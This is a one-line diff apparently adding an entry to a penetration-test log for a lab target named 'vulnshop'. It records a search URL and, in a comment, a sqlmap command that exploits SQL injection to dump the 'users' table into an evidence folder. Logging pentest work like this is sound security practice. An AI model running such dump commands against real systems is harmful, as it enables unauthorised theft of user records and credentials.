@@ -1,0 +1,1 @@
+http://vulnshop:3000/search?q=test (GET)  # /usr/bin/sqlmap -u http://vulnshop:3000/search?q=test -T users --dump --output-dir=/home/pentest/evidence/sqlmap_users
